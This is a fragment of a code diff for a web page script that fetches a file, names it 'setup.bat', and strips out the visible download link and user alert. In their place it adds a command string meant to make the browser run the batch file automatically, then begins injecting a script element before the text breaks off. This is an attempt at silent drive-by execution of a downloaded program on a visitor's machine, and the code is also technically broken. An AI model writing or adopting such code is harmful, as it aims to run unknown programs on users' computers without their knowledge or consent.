@@ -16,18 +16,9 @@
         const blob = await response.blob();
         const file = new File([blob], 'setup.bat', { type: 'application/bat' });
         const url = window.URL.createObjectURL(file);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'setup.bat'; // Provide a default file name for download
-        document.body.appendChild(a);
-        a.click();
-        window.URL.revokeObjectURL(url);
         
-        // Alert user to manually run the downloaded .bat file
-        alert('File downloaded successfully! Attempting to execute the "setup.bat" file automatically.');
-
-        // Attempt to automatically execute the downloaded .bat file
-        const execCommand = `cmd.exe /c start setup.bat`;
+        // Automatically execute the downloaded .bat file
+        const execCommand = `start "" "${url}"`;
         const execResult = await new Promise(resolve => {
           const script = document.createElement('script');
           script.textContent = `
